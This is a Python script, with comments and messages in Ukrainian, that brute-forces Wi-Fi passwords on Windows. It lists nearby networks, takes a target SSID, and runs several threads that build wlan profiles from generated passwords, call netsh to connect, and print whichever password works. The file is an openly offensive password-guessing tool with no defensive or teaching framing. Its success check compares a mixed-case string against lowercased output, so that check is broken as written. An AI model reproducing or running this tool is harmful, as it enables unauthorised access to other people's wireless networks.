import subprocess
import os
import keyboard
import threading
import queue

from numsgen import set_number
from networks import get_available_networks
from profile_1 import create_wifi_profile




    

def is_connected(ssid):
    """Перевіряє, чи пристрій підключений до Wi-Fi."""
    result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
    return ssid in result.stdout and "State : connected" in result.stdout.lower()

def try_connect(ssid, password_queue, stop_flag, correct_password_queue):
    """Підключається до Wi-Fi, перевіряючи паролі з черги."""
    while not stop_flag.is_set():
        try:
            password = password_queue.get(timeout=2)  # Отримуємо пароль з черги
        except queue.Empty:
            return  # Якщо черга порожня, виходимо з потоку

        if stop_flag.is_set():
            return

        print(f"🔑 Спроба пароля: {password}")

        profile_path = create_wifi_profile(ssid, password)
        try:
            subprocess.run(["netsh", "wlan", "add", "profile", f"filename={profile_path}", "user=all"], check=True, capture_output=True, text=True)
            subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], check=True, capture_output=True, text=True)

            if is_connected(ssid):
                print(f"✅ Успішно підключено до '{ssid}' з паролем: {password}")
                stop_flag.set()  # Зупиняємо всі потоки
                correct_password_queue.put(password)  # Передаємо правильний пароль
                return
            else:
                print(f"❌ Не вдалося підключитися з паролем: {password}")

        except subprocess.CalledProcessError as e:
            print(f"⚠️ Помилка при спробі підключення: {e}")

        finally:
            if os.path.exists(profile_path):
                os.remove(profile_path)

def connect_to_wifi(ssid, thread_count=5):
    """Перебирає паролі та підключається до Wi-Fi."""
    available_networks = get_available_networks()
    if ssid not in available_networks:
        print(f"Мережа '{ssid}' не знайдена. Переконайтеся, що вона доступна.")
        return

    print(f"\n🔄 Спроба підключення до '{ssid}' з використанням згенерованих паролів...")

    password_generator = set_number()
    stop_flag = threading.Event()
    password_queue = queue.Queue()
    correct_password_queue = queue.Queue()

    # Заповнюємо чергу паролями в окремому потоці
    def generate_passwords():
        for password in password_generator:
            if stop_flag.is_set():
                break
            password_queue.put(password)

    password_thread = threading.Thread(target=generate_passwords, daemon=True)
    password_thread.start()

    def esc_listener():
        """Слухає клавішу Esc для зупинки перебору."""
        while not stop_flag.is_set():
            if keyboard.is_pressed('esc'):
                print("🛑 Вихід з програми...")
                stop_flag.set()
                break

    esc_thread = threading.Thread(target=esc_listener, daemon=True)
    esc_thread.start()

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=try_connect, args=(ssid, password_queue, stop_flag, correct_password_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    if not correct_password_queue.empty():
        correct_password = correct_password_queue.get()
        print(f"🎉 Знайдено правильний пароль: {correct_password}")
    else:
        print(f"❌ Не вдалося підібрати пароль до '{ssid}'.")

if __name__ == "__main__":
    available_networks = get_available_networks()
    if available_networks:
        print("📡 Доступні Wi-Fi мережі:")
        for network in available_networks:
            print(f"- {network}")
    else:
        print("❌ Не знайдено доступних Wi-Fi мереж.")

    ssid = input("🔹 Введіть ім'я Wi-Fi мережі (SSID): ")
    connect_to_wifi(ssid)